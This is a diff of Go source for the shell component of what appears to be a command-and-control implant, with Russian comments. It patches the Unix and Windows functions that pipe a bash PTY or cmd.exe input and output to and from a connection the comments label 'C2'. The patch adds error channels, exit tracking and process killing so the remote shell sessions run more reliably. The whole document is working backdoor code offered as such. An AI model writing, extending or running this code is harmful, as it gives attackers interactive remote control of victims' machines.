@@ -47,42 +47,71 @@ func (s *Shell) runUnix() {
     
     s.conn.SetReadDeadline(time.Time{})
     
+		// Каналы для сигналов
+    errCh := make(chan error, 2)   // ошибки от горутин
+    doneCh := make(chan struct{})  // bash завершился
+		
+		// Горутина 1: C2 -> PTY (ввод команд)
     go func() {
         buf := make([]byte, 4096)
         for {
             n, err := s.conn.Read(buf)
             if n > 0 {
                 if _, writeErr := f.Write(buf[:n]); writeErr != nil {
-                    return
+                    errCh <- fmt.Errorf("write PTY: %w", writeErr)
+										return
                 }
             }
             if err != nil {
+								errCh <- fmt.Errorf("read C2: %w", err)
                 return
             }
         }
     }()
     
+		// Горутина 2: PTY -> C2 (вывод команд)
     go func() {
         buf := make([]byte, 4096)
         for {
             n, err := f.Read(buf)
             if n > 0 {
                 if _, writeErr := s.conn.Write(buf[:n]); writeErr != nil {
-                    return
+                    errCh <- fmt.Errorf("write C2: %w", writeErr)
+										return
                 }
             }
             if err != nil {
+								errCh <- fmt.Errorf("read PTY: %w", err)
                 return
             }
         }
     }()
     
-    err = cmd.Wait()
-    if err != nil {
-        fmt.Println("[*] Шелл завершился с ошибкой:", err)
-    } else {
-        fmt.Println("[*] Шелл завершился")
+    // Ждем завершения bash в отдельной горутине
+    go func() {
+        err := cmd.Wait()
+        if err != nil {
+            fmt.Println("[*] Шелл завершился с ошибкой:", err)
+        } else {
+            fmt.Println("[*] Шелл завершился")
+        }
+        close(doneCh)
+    }()
+
+    // Ждем первое событие: ошибка в горутине или завершение bash
+    select {
+    case err := <-errCh:
+        if err != nil {
+            fmt.Printf("[*] Ошибка: %v\n", err)
+        }
+        // Убиваем процесс, если он еще жив
+        if s.cmd != nil && s.cmd.Process != nil {
+            s.cmd.Process.Kill()
+        }
+    case <-doneCh:
+        // bash завершился сам
     }
+
     s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 }
 
@@ -114,58 +143,87 @@ func (s *Shell) runWindows() {
     
     s.conn.SetReadDeadline(time.Time{})
     
+		errCh := make(chan error, 3) // 3 горутины
+    doneCh := make(chan struct{})
+
+		// Горутина 1: C2 -> cmd (ввод)
     go func() {
         buf := make([]byte, 4096)
         for {
             n, err := s.conn.Read(buf)
             if n > 0 {
                 if _, writeErr := stdin.Write(buf[:n]); writeErr != nil {
-                    return
+                    errCh <- fmt.Errorf("write stdin: %w", writeErr)
+										return
                 }
             }
             if err != nil {
-                return
+                errCh <- fmt.Errorf("read C2: %w", err)
+								return
             }
         }
     }()
     
+		// Горутина 2: cmd -> C2 (stdout)
     go func() {
         buf := make([]byte, 4096)
         for {
             n, err := stdout.Read(buf)
             if n > 0 {
                 if _, writeErr := s.conn.Write(buf[:n]); writeErr != nil {
-                    return
+                    errCh <- fmt.Errorf("write C2 (stdout): %w", writeErr)
+										return
                 }
             }
             if err != nil {
+								errCh <- fmt.Errorf("read stdout: %w", err)
                 return
             }
         }
     }()
     
+		// Горутина 3: cmd -> C2 (stderr)
     go func() {
         buf := make([]byte, 4096)
         for {
             n, err := stderr.Read(buf)
             if n > 0 {
                 if _, writeErr := s.conn.Write(buf[:n]); writeErr != nil {
-                    return
+                    errCh <- fmt.Errorf("write C2 (stderr): %w", writeErr)
+										return
                 }
             }
             if err != nil {
+								errCh <- fmt.Errorf("read stderr: %w", err)
                 return
             }
         }
     }()
     
-    err = cmd.Wait()
-    if err != nil {
-        fmt.Println("[*] Шелл завершился с ошибкой:", err)
-    } else {
-        fmt.Println("[*] Шелл завершился")
+		// Ждем завершения cmd
+    go func() {
+        err := cmd.Wait()
+        if err != nil {
+            fmt.Println("[*] Шелл завершился с ошибкой:", err)
+        } else {
+            fmt.Println("[*] Шелл завершился")
+        }
+        close(doneCh)
+    }()
+
+    select {
+    case err := <-errCh:
+        if err != nil {
+            fmt.Printf("[*] Ошибка: %v\n", err)
+        }
+        if s.cmd != nil && s.cmd.Process != nil {
+            s.cmd.Process.Kill()
+        }
+    case <-doneCh:
+        // cmd завершился сам
     }
-    s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
+    
+		s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 }
 
 func (s *Shell) createPTY(cmd *exec.Cmd) (*os.File, error) {
